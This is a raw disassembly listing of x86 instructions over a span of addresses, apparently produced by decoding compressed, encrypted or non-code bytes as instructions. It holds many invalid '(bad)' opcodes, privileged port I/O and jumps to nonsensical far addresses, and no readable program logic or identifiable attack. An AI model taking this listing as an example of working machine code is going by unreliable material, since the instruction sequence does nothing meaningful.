  41f4f2:	cmp    al,0xe9
  41f4f4:	or     al,0x61
  41f4f6:	inc    esp
  41f4f7:	in     eax,0x54
  41f4f9:	imul   ebx,DWORD PTR [esi-0x12],0xffffff8b
  41f4fd:	mov    esi,0xaf4bff5
  41f502:	jle    0x41f523
  41f504:	push   0xfffffff1
  41f506:	or     ebx,0x6edce9d3
  41f50c:	inc    edi
  41f50d:	out    0x7e,al
  41f50f:	mov    ds:0x487b0b,eax
  41f514:	cmp    ch,BYTE PTR [ebx+0x47]
  41f517:	lock cdq 
  41f519:	add    al,0xc5
  41f51b:	out    0x5d,eax
  41f51d:	push   ss
  41f51e:	repnz cld 
  41f520:	gs mov eax,0xf00e8401
  41f526:	add    al,0x0
  41f528:	pop    esp
  41f529:	cmp    edx,ebp
  41f52b:	push   eax
  41f52c:	mov    ebx,0x1428bcc
  41f531:	mov    ecx,0xf7d9f047
  41f536:	add    al,0x0
  41f538:	bound  edi,QWORD PTR [ebx]
  41f53a:	in     eax,dx
  41f53b:	mov    ecx,ebp
  41f53d:	jge    0x41f509
  41f53f:	mov    edi,0x6f08fbd1
  41f544:	imul   eax,DWORD PTR [eax],0x0
	...
  41f55e:	xchg   esi,eax
  41f55f:	add    DWORD PTR [eax-0x408d8edc],ecx
  41f565:	dec    eax
  41f566:	lds    edi,FWORD PTR es:[edi+0x3c]
  41f56a:	popa   
  41f56b:	ins    BYTE PTR es:[edi],dx
  41f56c:	jbe    0x41f547
  41f56e:	ja     0x41f5b7
  41f570:	std    
  41f571:	ja     0x41f573
  41f573:	mov    ebx,0xfedd80be
  41f578:	pop    esp
  41f579:	xchg   esi,eax
  41f57a:	inc    eax
  41f57b:	jg     0x41f5be
  41f57d:	fld1   
  41f57f:	mov    edx,0x8a348fd0
  41f584:	or     edi,DWORD PTR [ebx-0x1102a883]
  41f58a:	imul   edi,DWORD PTR [ebp+0x166faafd],0x7637652f
  41f594:	or     dh,dh
  41f596:	inc    ecx
  41f597:	mov    ebp,0xf2c6e587
  41f59c:	rcl    BYTE PTR [esi-0x4e],0xec
  41f5a0:	cld    
  41f5a1:	pushf  
  41f5a2:	out    0x76,eax
  41f5a4:	lods   al,BYTE PTR ds:[esi]
  41f5a5:	add    dl,ah
  41f5a7:	mov    bh,0xbf
  41f5a9:	(bad)  
  41f5aa:	fnstenv ds:0xfd888b2e
  41f5b0:	imul   eax,DWORD PTR [esi],0xf75bd3ce
  41f5b6:	jmp    0xffbd:0x2b0fbfef
  41f5bd:	int    0x48
  41f5bf:	aam    0x71
  41f5c1:	or     eax,DWORD PTR [eax]
	...
  41f5db:	fiadd  DWORD PTR [esi]
  41f5dd:	jb     0x41f654
  41f5df:	popf   
  41f5e0:	add    eax,0xdc8fc380
  41f5e5:	dec    esi
  41f5e6:	mov    ecx,DWORD PTR [eax-0x3]
  41f5e9:	imul   eax,DWORD PTR ds:0xf75bd34e,0x75ce83aa
  41f5f3:	test   esi,eax
  41f5f5:	std    
  41f5f6:	popa   
  41f5f7:	xor    al,0x73
  41f5f9:	add    bl,ch
  41f5fb:	add    al,0x82
  41f5fd:	inc    ecx
  41f5fe:	or     BYTE PTR [ebp-0x65f48ef7],al
  41f604:	pop    es
  41f605:	outs   dx,BYTE PTR gs:[esi]
  41f607:	stos   DWORD PTR es:[edi],eax
  41f608:	pop    ebp
  41f609:	add    bl,0x59
  41f60c:	loop   0x41f634
  41f60e:	push   0x5e
  41f610:	cmp    dl,dl
  41f612:	pop    edi
  41f613:	push   0xfffffff5
  41f615:	adc    edx,0x1c300d8
  41f61b:	xor    dh,BYTE PTR [edi+0x63]
  41f61e:	add    BYTE PTR [esi+0x2545f614],al
  41f624:	or     BYTE PTR [ecx+0x8],dh
  41f627:	dec    edx
  41f628:	pop    es
  41f629:	outs   dx,BYTE PTR ds:[esi]
  41f62a:	or     DWORD PTR gs:0x7da06e7,eax
  41f631:	pop    edi
  41f632:	outs   dx,DWORD PTR ds:[esi]
  41f633:	xor    BYTE PTR ds:0xdef4c380,al
  41f639:	or     DWORD PTR [esi+0x300028b7],esi
	...
  41f657:	add    ah,dh
  41f659:	jae    0x41f620
  41f65b:	pop    eax
  41f65c:	inc    ebx
  41f65d:	xor    eax,0x90f403c6
  41f662:	(bad)  
  41f663:	jmp    0x41f6dc
  41f665:	xor    dl,BYTE PTR [esi+edx*2+0x23]
  41f669:	jns    0x41f6aa
  41f66b:	call   0x348c0c94
  41f670:	cmc    
  41f671:	fnstsw WORD PTR [edi+edi*4+0x28]
  41f675:	jecxz  0x41f62f
  41f677:	fdiv   st,st(3)
  41f679:	fld    QWORD PTR [eax]
  41f67b:	data16 (bad) [eax+0x68ee70e8]
  41f682:	aas    
  41f683:	call   0xc051d5ac
  41f688:	out    0x1d,al
  41f68a:	add    al,0xe8
  41f68c:	sub    edx,DWORD PTR [edx+0x4]
  41f68f:	add    BYTE PTR [edi+0x41],dh
  41f692:	cld    
  41f693:	(bad)  
  41f694:	jl     0x41f6bf
  41f696:	clc    
  41f697:	mov    esp,0xe148
  41f69c:	ja     0x41f6cf
  41f69e:	or     al,0x0
  41f6a0:	ret    
  41f6a1:	xor    BYTE PTR [edi*8+0x401649e9],cl
  41f6a8:	hlt    
  41f6a9:	xchg   edx,eax
  41f6aa:	adc    ch,bh
  41f6ac:	leave  
  41f6ad:	cmc    
  41f6ae:	stc    
  41f6af:	adc    bl,al
  41f6b1:	jmp    0x3:0xdbf10040
  41f6b8:	hlt    
  41f6b9:	lock mov DWORD PTR ss:[eax],eax
	...
  41f6d5:	mov    ecx,0x5dd23671
  41f6da:	xchg   BYTE PTR ds:0xf476f400,al
  41f6e0:	mov    dh,BYTE PTR [ecx-0x7977b0fc]
  41f6e6:	mov    ah,0xb8
  41f6e8:	jmp    0x41f683
  41f6ea:	out    dx,al
  41f6eb:	push   ebp
  41f6ec:	cli    
  41f6ed:	lock dec ecx
  41f6ef:	dec    ebx
  41f6f0:	jg     0x41f69d
  41f6f2:	js     0x41f6da
  41f6f4:	mov    es,WORD PTR [esi+0x1]
  41f6f7:	jb     0x41f6c2
  41f6f9:	shl    ebx,cl
  41f6fb:	pop    edi
  41f6fc:	cli    
  41f6fd:	rol    BYTE PTR [ebx+0xd40033e],1
  41f703:	scas   eax,DWORD PTR es:[edi]
  41f704:	dec    ebx
  41f705:	dec    eax
  41f706:	add    DWORD PTR [esi],ebx
  41f708:	inc    eax
  41f709:	mov    esp,0x9bfb9385
  41f70e:	add    esp,edi
  41f710:	add    esp,DWORD PTR [esi]
  41f712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f713:	mov    eax,0x304f40c3
  41f718:	(bad)
  41f71b:	aaa    
  41f71c:	add    al,0x9d
  41f71e:	not    BYTE PTR [ebx-0x2d7c6072]
  41f724:	adc    al,0x25
  41f726:	push   edi
  41f727:	jb     0x41f758
  41f729:	fcom   QWORD PTR [edi+eiz*1]
  41f72c:	add    al,0x25
  41f72e:	int3   
  41f72f:	cmp    DWORD PTR [edi+0x5516ecb6],eax
  41f735:	into   
  41f736:	or     BYTE PTR [edx],bl
  41f738:	push   ebp
	...
  41f751:	add    ch,al
  41f753:	out    dx,eax
  41f754:	cmp    ecx,DWORD PTR [esp+edi*2]
  41f757:	push   ecx
  41f758:	scas   al,BYTE PTR es:[edi]
  41f759:	ins    BYTE PTR es:[edi],dx
  41f75a:	dec    ebx
  41f75b:	out    dx,eax
  41f75c:	out    0x83,al
  41f75e:	inc    eax
  41f75f:	(bad)  
  41f760:	arpl   sp,ax
  41f762:	(bad)  
  41f763:	push   ebx
  41f764:	ds (bad) 
  41f766:	out    dx,al
  41f767:	adc    bh,dh
  41f769:	inc    ebx
  41f76a:	hlt    
  41f76b:	jge    0x41f790
  41f76d:	or     al,0x8e
  41f76f:	or     BYTE PTR [esi+0x6f],bh
  41f772:	call   0xa22ef7d1
  41f777:	push   es
  41f778:	pop    eax
  41f779:	cmp    DWORD PTR [ebp+0x7ae90070],0x72b9f042
  41f783:	inc    edx
  41f784:	hlt    
  41f785:	mov    ecx,0xba015b48
  41f78a:	inc    eax
  41f78b:	push   esp
  41f78c:	std    
  41f78d:	mov    esp,0x4172effb
  41f792:	fstp   st(0)
  41f794:	sub    BYTE PTR [ecx],0x63
  41f797:	cld    
  41f798:	cld    
  41f799:	mov    ah,0xdb
  41f79b:	icebp  
  41f79c:	aam    0x6a
  41f79e:	dec    ebx
  41f79f:	cmc    
  41f7a0:	(bad)  
  41f7a1:	xchg   esp,eax
  41f7a2:	call   0x79233a96
  41f7a7:	imul   ecx,DWORD PTR [eax],0xffffff85
  41f7aa:	and    esp,eax
  41f7ac:	call   0xfd85ad9e
  41f7b1:	call   0xf73a6b52
	...
  41f7ce:	add    BYTE PTR [ecx+edx*2+0x508ca48a],ah
  41f7d5:	pop    ecx
  41f7d6:	mov    al,0xb9
  41f7d8:	push   es
  41f7d9:	add    BYTE PTR [ebx+esi*2],dh
  41f7dc:	pop    edx
  41f7dd:	and    al,0x65
  41f7df:	jbe    0x41f7bb
  41f7e1:	iret   
  41f7e2:	jmp    0x41f7db
  41f7e4:	add    al,0x51
  41f7e6:	pop    ds
  41f7e7:	lds    esi,FWORD PTR [ebx]
  41f7e9:	shr    BYTE PTR [edx+esi*2-0x5e],0xfa
  41f7ee:	mov    dh,0x4c
  41f7f0:	aas    
  41f7f1:	push   eax
  41f7f2:	sbb    edx,ebx
  41f7f4:	sub    BYTE PTR [eax-0x25],dl
  41f7f7:	and    cl,dh
  41f7f9:	adc    al,BYTE PTR [ecx-0x1f]
  41f7fc:	inc    esp
  41f7fd:	add    BYTE PTR [edi+esi*1+0x73],ch
  41f801:	jno    0x41f865
  41f803:	fisub  DWORD PTR [eax+0x8cd0010]
  41f809:	mov    DWORD PTR [ebp-0x4094f],eax
  41f80f:	in     eax,dx
  41f810:	jmp    0x41f7e4
  41f812:	mov    ebx,DWORD PTR [eax+0x6]
  41f815:	or     eax,0x23e10d40
  41f81a:	lea    edx,[eax+0x4afff98d]
  41f820:	push   edx
  41f821:	sti    
  41f822:	adc    eax,0x401875
  41f827:	push   0x1afda16f
  41f82c:	in     eax,dx
  41f82d:	dec    esp
  41f82e:	push   DWORD PTR [eax+0x400fad]
	...
  41f84c:	(bad)  [esi-0x43]
  41f84f:	je     0x41f82c
  41f851:	xchg   BYTE PTR [ecx-0x413275c],al
  41f857:	push   eax
  41f858:	or     dl,ah
  41f85a:	fs dec ax
  41f85d:	das    
  41f85e:	lods   al,BYTE PTR ds:[esi]
  41f85f:	push   eax
  41f860:	sub    BYTE PTR [edi-0x5f],ch
  41f863:	std    
  41f864:	call   0xbd6e:0xf2ff4cf5
  41f86b:	je     0x41f840
  41f86d:	arpl   WORD PTR [edi+0x7d],di
  41f870:	dec    ebp
  41f871:	imul   esi,DWORD PTR [ecx+0x1b],0x337c739a
  41f878:	popf   
  41f879:	dec    esi
  41f87a:	test   DWORD PTR [ebp+0x49],eax
  41f87d:	jl     0x41f8c0
  41f87f:	sar    ch,0xf5
  41f882:	adc    DWORD PTR [ebx+eax*2-0x627affbf],esp
  41f889:	jae    0x41f88f
  41f88b:	mov    bl,0x5c
  41f88d:	fiadd  DWORD PTR [esi]
  41f88f:	push   0x3d
  41f891:	div    BYTE PTR [ecx+0x7c]
  41f894:	gs cdq 
  41f896:	out    dx,eax
  41f897:	add    ah,dh
  41f899:	fist   DWORD PTR [ebp+0x5e]
  41f89c:	jle    0x41f838
  41f89e:	pop    eax
  41f89f:	cmp    DWORD PTR [ecx],0xf0c1cbef
  41f8a5:	fisttp DWORD PTR [edi-0x77]
  41f8a8:	and    BYTE PTR [eax+ebp*8+0x1b],bl
  41f8ac:	cmc    
  41f8ad:	fild   DWORD PTR [eax]
  41f8af:	push   ecx
	...
  41f8c8:	add    BYTE PTR [edx-0x4ef9952],ch
  41f8ce:	xlat   BYTE PTR ds:[ebx]
  41f8cf:	or     BYTE PTR [ecx-0xfb89e33],cl
  41f8d5:	inc    ebp
  41f8d6:	inc    esi
  41f8d7:	retf   0xf4f1
  41f8da:	fnsave [ebx]
  41f8dc:	inc    ebx
  41f8dd:	in     al,0xc4
  41f8df:	xor    eax,DWORD PTR [ebx-0x38]
  41f8e2:	sbb    eax,0xed520fec
  41f8e7:	aas    
  41f8e8:	test   BYTE PTR [edi],0x23
  41f8eb:	xor    edi,eax
  41f8ed:	pop    es
  41f8ee:	push   ds
  41f8ef:	mov    dl,BYTE PTR [ebx-0x7]
  41f8f2:	loope  0x41f924
  41f8f4:	push   esp
  41f8f5:	stc    
  41f8f6:	adc    eax,0xda9c8144
  41f8fb:	add    eax,0x819db344
  41f900:	idiv   ah
  41f902:	outs   dx,DWORD PTR ds:[esi]
  41f903:	jmp    0x8323:0x6cce0936
  41f90a:	dec    ecx
  41f90b:	adc    al,0x8b
  41f90d:	jno    0x41f8e5
  41f90f:	repnz cld 
  41f911:	jae    0x41f978
  41f913:	mov    eax,0xf5bb6ae7
  41f918:	out    0x83,eax
  41f91a:	pop    ebp
  41f91b:	idiv   ah
  41f91d:	into   
  41f91e:	int    0x56
  41f920:	mov    ecx,ecx
  41f922:	lods   eax,DWORD PTR ds:[esi]
  41f923:	xchg   DWORD PTR [edx-0x30a63a4],eax
  41f929:	dec    esp
  41f92a:	add    eax,0x84c3
	...
  41f943:	add    BYTE PTR [eax],al
  41f945:	add    BYTE PTR [eax],bh
  41f947:	in     al,dx
  41f948:	in     eax,dx
  41f949:	lods   eax,DWORD PTR ds:[esi]
  41f94a:	mov    dh,0x10
  41f94c:	ret    0xa7be
  41f94f:	and    BYTE PTR [edi],bl
  41f951:	jo     0x41f943
  41f953:	cmp    al,0xfc
  41f955:	adc    eax,0x43f6315c
  41f95a:	hlt    
  41f95b:	pop    esi
  41f95c:	out    dx,al
  41f95d:	jmp    0x4b4:0x6f22acf0
  41f964:	sar    ebp,1
  41f966:	cwde   
  41f967:	push   esp
  41f968:	jb     0x41f928
  41f96a:	jl     0x41f963
  41f96c:	ds mov edx,es
  41f96f:	add    al,0xe7
  41f971:	mov    bh,bh
  41f973:	outs   dx,DWORD PTR ds:[esi]
  41f974:	shr    DWORD PTR [ebx],1
  41f976:	inc    ebp
  41f977:	jp     0x41f91c
  41f979:	repz inc ebx
  41f97b:	in     al,dx
  41f97c:	(bad)  [ebx+0x56e744e1]
  41f982:	and    dl,BYTE PTR [eax+0x30]
  41f985:	shr    ebx,0x4
  41f988:	mov    ch,0x8a
  41f98a:	mov    ds:0xf403f9dc,al
  41f98f:	add    al,0x15
  41f991:	aas    
  41f992:	fdivr  st,st(4)
  41f994:	out    0x6f,eax
  41f996:	repnz push edx
  41f998:	paddusw mm4,QWORD PTR [edx-0x4e7518fc]
  41f99f:	dec    edx
  41f9a0:	sub    edi,edi
  41f9a2:	cmp    DWORD PTR [esi+0x2c],0xc
  41f9a6:	mov    cl,0x2
  41f9a8:	xor    ebp,DWORD PTR [ebp+0x0]
	...
  41f9c3:	mov    ah,0x4
  41f9c5:	ins    BYTE PTR es:[edi],dx
  41f9c6:	(bad)  
  41f9c7:	out    0xfe,eax
  41f9c9:	popa   
  41f9ca:	or     al,0xc4
  41f9cc:	jmp    0x41f9e5
  41f9ce:	or     al,0x75
  41f9d0:	(bad)  
  41f9d1:	out    dx,eax
  41f9d2:	add    edi,DWORD PTR [ebp-0x46]
  41f9d5:	(bad)  
  41f9d6:	mov    edi,0xe8ff0f8b
  41f9db:	mov    dl,0x7d
  41f9dd:	jmp    0x41fa17
  41f9df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9e0:	test   DWORD PTR [eax-0xf],edi
  41f9e3:	div    DWORD PTR [eax+0x4]
  41f9e6:	pop    ecx
  41f9e7:	test   ebx,0xecc36ac0
  41f9ed:	call   FWORD PTR [esi]
  41f9ef:	mov    BYTE PTR [ebp+edx*1+0x29],al
  41f9f3:	clc    
  41f9f4:	pop    esp
  41f9f5:	pusha  
  41f9f6:	fidiv  WORD PTR [edi-0x237317fc]
  41f9fc:	jmp    0x41f9fa
  41f9fe:	jb     0x41fa00
  41fa00:	xchg   ch,dh
  41fa02:	aad    0x2d
  41fa04:	jl     0x41fa0b
  41fa06:	push   0x4b
  41fa08:	jmp    0xe97d560c
  41fa0d:	dec    esi
  41fa0e:	lahf   
  41fa0f:	loopne 0x41fa4b
  41fa11:	sbb    al,0x64
  41fa13:	mov    eax,0xb622277
  41fa18:	jmp    0xc86239f
  41fa1d:	mov    ecx,esi
  41fa1f:	jb     0x41fa78
  41fa21:	clc    
  41fa22:	mov    ebx,0xf54ee847
	...
  41fa3f:	add    BYTE PTR [edx],ch
  41fa41:	stos   BYTE PTR es:[edi],al
  41fa42:	jae    0x41fa29
  41fa44:	je     0x41faad
  41fa46:	clc    
  41fa47:	jmp    0x733e41b8
  41fa4c:	add    BYTE PTR [ebp-0x3],dl
  41fa4f:	cwde   
  41fa50:	(bad)  
  41fa51:	jnp    0x41fa58
  41fa53:	xchg   edi,eax
  41fa54:	mov    BYTE PTR [edx],bh
  41fa56:	or     BYTE PTR [edx-0x46],dh
  41fa59:	in     al,dx
  41fa5a:	pop    ebp
  41fa5b:	fs aaa 
  41fa5d:	jbe    0x41fa62
  41fa5f:	pusha  
  41fa60:	mov    ah,0xfc
  41fa62:	call   0xc7071fd9
  41fa67:	add    BYTE PTR [esi-0x131378c5],cl
  41fa6d:	jnp    0x41faab
  41fa6f:	or     dh,bl
  41fa71:	dec    edx
  41fa72:	cld    
  41fa73:	add    dh,dl
  41fa75:	std    
  41fa76:	mov    BYTE PTR [ebp-0x6f],dl
  41fa79:	push   esp
  41fa7a:	push   eax
  41fa7b:	(bad)  
  41fa7c:	in     al,dx
  41fa7d:	cmp    BYTE PTR [ecx+0x7f0509c0],al
  41fa83:	gs jno 0x41fa8c
  41fa86:	xchg   DWORD PTR [ebp+0x71],eax
  41fa89:	mov    edi,0x30e556bf
  41fa8e:	adc    eax,DWORD PTR [eax+0x1d]
  41fa91:	pop    esi
  41fa92:	push   eax
  41fa93:	pop    ss
  41fa94:	int    0x0
  41fa96:	call   0x47ebf5
  41fa9b:	mov    ecx,DWORD PTR [ebp+0x6b]
  41fa9e:	repz je 0x41fa46
  41faa1:	cmp    bl,bh
  41faa3:	je     0x41faa5
	...
  41fabd:	stc    
  41fabe:	cld    
  41fabf:	cli    
  41fac0:	adc    eax,0x401489
  41fac5:	inc    esi
  41fac6:	out    dx,al
  41fac7:	cmp    edi,0x6871a89
  41facd:	push   0x37
  41facf:	sti    
  41fad0:	push   eax
  41fad1:	lods   eax,DWORD PTR ds:[esi]
  41fad2:	push   0xffffffbd
  41fad4:	jne    0x41fa9d
  41fad6:	add    BYTE PTR [ebx-0x78ea46b4],dh
  41fadc:	push   es
  41fadd:	pop    esp
  41fade:	aaa    
  41fadf:	sti    
  41fae0:	push   eax
  41fae1:	mov    ch,0x6a
  41fae3:	mov    ebp,0x70f09775
  41fae8:	and    al,0xa9
  41faea:	jl     0x41faee
  41faec:	push   esi
  41faed:	xchg   edx,eax
  41faee:	push   esi
  41faef:	xor    BYTE PTR [ebp-0x74f394b3],al
  41faf5:	pop    ebx
  41faf6:	inc    edi
  41faf7:	add    BYTE PTR [esi-0xc],dl
  41fafa:	rcl    BYTE PTR [ebx+0x40],cl
  41fafd:	jns    0x41fa9a
  41faff:	ja     0x41fb09
  41fb01:	outs   dx,DWORD PTR ds:[esi]
  41fb02:	fst    DWORD PTR [esi-0x3]
  41fb05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb06:	repz xor eax,0x16b2a3f6
  41fb0c:	cmp    al,0xe7
  41fb0e:	sbb    eax,DWORD PTR [ecx+ecx*4]
  41fb11:	xor    al,BYTE PTR [edx+0x52]
  41fb14:	ret    0xdc00
  41fb17:	push   edi
  41fb18:	mov    DWORD PTR [eax],ebx
  41fb1a:	sub    al,0x7d
  41fb1c:	inc    edx
  41fb1d:	in     al,dx
  41fb1e:	xor    DWORD PTR [ecx-0x18],ebx
	...
  41fb39:	add    BYTE PTR [edx+0x7ffcf082],bh
  41fb3f:	imul   eax,DWORD PTR [edi-0x7ae67f0b],0x62
  41fb46:	add    bl,bl
  41fb48:	jge    0x41fb4f
  41fb4a:	imul   esi,DWORD PTR [eax-0x2e0cb114],0xa1a30d14
  41fb54:	adc    BYTE PTR [edi+0x4a],cl
  41fb57:	aaa    
  41fb58:	push   esp
  41fb59:	sub    BYTE PTR [ecx+0x1e],dh
  41fb5c:	js     0x41fb62
  41fb5e:	ja     0x41fb21
  41fb60:	in     al,dx
  41fb61:	(bad)  
  41fb62:	jle    0x41fb3c
  41fb64:	push   esi
  41fb65:	std    
  41fb66:	and    al,0xe6
  41fb68:	jge    0x41fbac
  41fb6a:	mov    eax,0xb482f473
  41fb6f:	xchg   edx,eax
  41fb70:	or     ecx,DWORD PTR [ecx+0x4ff183fc]
  41fb76:	mov    ds:0x9c8950ad,eax
  41fb7b:	jae    0x41fb87
  41fb7d:	push   esi
  41fb7e:	xchg   ebx,eax
  41fb7f:	mov    ?,eax
  41fb81:	xor    BYTE PTR [ecx+ebx*2+0x1e680cf1],dh
  41fb88:	fld    QWORD PTR [edi+0x7b]
  41fb8b:	add    eax,0x7271185c
  41fb90:	div    edx
  41fb92:	out    0xf8,al
  41fb94:	mov    esi,0xcde86129
  41fb99:	jle    0x41fbfe
  41fb9b:	add    ch,0x78
	...
  41fbb6:	add    al,bh
  41fbb8:	xor    ah,BYTE PTR [edi+0x2b7c1bde]
  41fbbe:	cld    
  41fbbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbc0:	fdiv   QWORD PTR [edi+0x71e838f1]
  41fbc6:	repz jbe 0x41fbb8
  41fbc9:	adc    ecx,DWORD PTR [eax]
  41fbcb:	out    0xcb,al
  41fbcd:	adc    DWORD PTR [edi],0x5a35ff6d
  41fbd3:	sbb    DWORD PTR [ebp-0x39],edx
  41fbd6:	jle    0x41fc03
  41fbd8:	jl     0x41fbbe
  41fbda:	pop    ecx
  41fbdb:	or     DWORD PTR [ebp-0x21],edx
  41fbde:	mov    BYTE PTR [eax+edi*8],bl
  41fbe1:	push   edx
  41fbe2:	(bad)  
  41fbe3:	ins    BYTE PTR es:[edi],dx
  41fbe4:	add    BYTE PTR [esi+0x70fd43f2],bh
  41fbea:	(bad)  
  41fbeb:	dec    esp
  41fbec:	dec    eax
  41fbed:	mov    ch,0xbc
  41fbef:	mov    ch,0x14
  41fbf1:	out    0x58,eax
  41fbf3:	ins    DWORD PTR es:[edi],dx
  41fbf4:	fsub   DWORD PTR [edi-0x21]
  41fbf7:	out    dx,eax
  41fbf8:	add    bh,ah
  41fbfa:	add    esp,DWORD PTR ds:0x28cef94f
  41fc00:	call   0x452837d8
  41fc05:	out    0x86,eax
  41fc07:	stos   DWORD PTR es:[edi],eax
  41fc08:	out    0x92,eax
  41fc0a:	outs   dx,DWORD PTR ds:[esi]
  41fc0b:	pop    esp
  41fc0c:	adc    al,0x9b
  41fc0e:	cld    
  41fc0f:	ins    BYTE PTR es:[edi],dx
  41fc10:	mov    bh,0xfe
  41fc12:	push   edx
  41fc13:	inc    esp
  41fc14:	push   es
  41fc15:	out    0xde,eax
  41fc17:	stc    
  41fc18:	dec    edi
  41fc19:	cmovl  eax,DWORD PTR [eax]
	...
  41fc34:	pusha  
  41fc35:	out    0xff,eax
  41fc37:	cmc    
  41fc38:	jp     0x41fbe1
  41fc3a:	jb     0x41fbc0
  41fc3c:	pop    ds
  41fc3d:	add    edi,edi
  41fc3f:	call   0x6d167a3b
  41fc44:	jmp    0x41fc21
  41fc46:	cli    
  41fc47:	(bad)  
  41fc48:	fistp  QWORD PTR gs:[edx]
  41fc4b:	xchg   ecx,eax
  41fc4c:	lock add al,0x8b
  41fc4f:	ins    BYTE PTR es:[edi],dx
  41fc50:	push   esp
  41fc51:	jmp    0xad12:0xe9a0befc
  41fc58:	jmp    0xc39dfca1
  41fc5d:	lock mov bh,0x66
  41fc60:	clc    
  41fc61:	add    al,0x0
  41fc63:	xchg   ecx,eax
  41fc64:	cld    
  41fc65:	outs   dx,BYTE PTR ds:[esi]
  41fc66:	add    cl,ch
  41fc68:	mov    ds:0x2592e382,al
  41fc6d:	call   0x7e3a0fc1
  41fc72:	lds    ebx,FWORD PTR [ecx]
  41fc74:	mov    eax,DWORD PTR [edx-0x17fa8b15]
  41fc7a:	dec    edi
  41fc7b:	outs   dx,BYTE PTR ds:[esi]
  41fc7c:	jecxz  0x41fc92
  41fc7e:	pop    gs
  41fc80:	test   DWORD PTR [ecx+0x5afbd5bf],0xe27b63ff
  41fc8a:	clc    
  41fc8b:	dec    esi
  41fc8c:	in     eax,0x36
  41fc8e:	push   ebp
  41fc8f:	inc    esi
  41fc90:	jmp    0x41fca2
  41fc92:	pop    gs
  41fc94:	idiv   DWORD PTR [ecx-0x7e]
  41fc97:	dec    ebp
	...
  41fcb0:	add    cl,dl
  41fcb2:	jmp    0xd6e196b3
  41fcb7:	nop
  41fcb8:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41fcba:	jmp    0x73e6ea31
  41fcbf:	or     BYTE PTR [esi-0x17b42941],bh
  41fcc5:	test   DWORD PTR [eax-0x9efff41],0x6fad4537
  41fccf:	add    DWORD PTR [eax+0x1670e886],eax
  41fcd5:	jne    0x41fce9
  41fcd7:	and    eax,DWORD PTR [eax]
  41fcd9:	pop    ebp
  41fcda:	cmc    
  41fcdb:	adc    DWORD PTR [edi+ebp*2+0x42],esp
  41fcdf:	add    dh,bh
  41fce1:	mov    cs,ebx
  41fce3:	dec    eax
  41fce4:	jmp    FWORD PTR [edx]
  41fce6:	cmc    
  41fce7:	lods   al,BYTE PTR ds:[esi]
  41fce8:	add    DWORD PTR [esi],esp
  41fcea:	add    BYTE PTR [edx],dh
  41fcec:	shr    bl,0x37
  41fcef:	vmulss xmm0,xmm7,DWORD PTR [edx]
  41fcf3:	push   ecx
  41fcf4:	mov    edi,DWORD PTR [ecx-0x7d]
  41fcf7:	call   0x441914
  41fcfc:	push   ebx
  41fcfd:	jecxz  0x41fd4a
  41fcff:	sti    
  41fd00:	xor    eax,0x3fd309
  41fd05:	mov    eax,0xae8f06e
  41fd0a:	daa    
  41fd0b:	std    
  41fd0c:	call   DWORD PTR [ecx-0x5c7bf43f]
  41fd12:	add    DWORD PTR [eax],eax
	...
  41fd2c:	add    BYTE PTR [eax],al
  41fd2e:	mov    ss,WORD PTR [esi+0x8]
  41fd31:	add    BYTE PTR [ebx],ah
  41fd33:	aas    
  41fd34:	sti    
  41fd35:	add    al,al
  41fd37:	adc    edi,ebx
  41fd39:	jne    0x41fd18
  41fd3b:	push   0x6f2a0c7a
  41fd40:	hlt    
  41fd41:	call   DWORD PTR [eax+0xbf6e4f1]
  41fd47:	cmc    
  41fd48:	sti    
  41fd49:	mov    BYTE PTR [eax-0x2ba760c],dl
  41fd4f:	leave  
  41fd50:	jns    0x41fd9f
  41fd52:	pushf  
  41fd53:	add    edi,esp
  41fd55:	imul   esp,DWORD PTR [esi],0x57
  41fd58:	hlt    
  41fd59:	push   edi
  41fd5a:	hlt    
  41fd5b:	push   cs
  41fd5c:	jbe    0x41fd4e
  41fd5e:	mov    WORD PTR [eax+0x7293ffdf],ds
  41fd64:	icebp  
  41fd65:	mov    dh,BYTE PTR [ecx]
  41fd67:	in     al,dx
  41fd68:	fldenv [edx+0x31]
  41fd6b:	fld    QWORD PTR [eax]
  41fd6d:	add    DWORD PTR [edx-0x5b97ad91],0xffffffd8
  41fd74:	add    BYTE PTR [eax],al
  41fd76:	fdivr  st(3),st
  41fd78:	bound  eax,QWORD PTR [eax-0xc]
  41fd7b:	pusha  
  41fd7c:	xchg   edi,esp
  41fd7e:	pop    edx
  41fd7f:	mov    dh,0xec
  41fd81:	out    0x91,eax
  41fd83:	inc    eax
  41fd84:	in     eax,dx
  41fd85:	cld    
  41fd86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd87:	jb     0x41fd46
  41fd89:	mov    BYTE PTR [edx],bh
  41fd8b:	ret    
  41fd8c:	xchg   BYTE PTR [esi],al
  41fd8e:	cmp    edx,DWORD PTR [esi+0xbf86]
	...
  41fda8:	add    BYTE PTR [eax],al
  41fdaa:	add    BYTE PTR [eax+0x1c8a7fd3],ch
  41fdb0:	test   esp,ebp
  41fdb2:	cld    
  41fdb3:	lds    ecx,FWORD PTR [esi+0x655f0876]
  41fdb9:	add    eax,DWORD PTR [eax]
  41fdbb:	hlt    
  41fdbc:	xchg   ebx,eax
  41fdbd:	loopne 0x41fdc6
  41fdbf:	or     esp,DWORD PTR [esi-0x78]
  41fdc2:	mov    edi,0x72edcb88
  41fdc7:	in     al,0xe
  41fdc9:	jns    0x41fe45
  41fdcb:	add    BYTE PTR [eax+ebx*8-0x12bc157c],ah
  41fdd2:	xchg   DWORD PTR [ecx],edi
  41fdd4:	cmp    edx,DWORD PTR [esi-0x18]
  41fdd7:	test   BYTE PTR [esp+eax*1],ah
  41fdda:	add    BYTE PTR [esi-0x4f],bh
  41fddd:	in     eax,dx
  41fdde:	pop    esp
  41fddf:	sub    ah,BYTE PTR [edi-0x120f3e45]
  41fde5:	repnz inc ebx
  41fde7:	adc    dl,ch
  41fde9:	add    edx,DWORD PTR [esi+0x7f]
  41fdec:	add    eax,0x3cf1c718
  41fdf1:	xchg   esi,eax
  41fdf2:	inc    ebx
  41fdf3:	hlt    
  41fdf4:	pop    eax
  41fdf5:	in     eax,dx
  41fdf6:	push   ebp
  41fdf7:	mov    WORD PTR [ebp-0x3],ss
  41fdfa:	add    esi,esp
  41fdfc:	(bad)  
  41fdfd:	sub    al,0x4e
  41fdff:	mov    dh,0x9
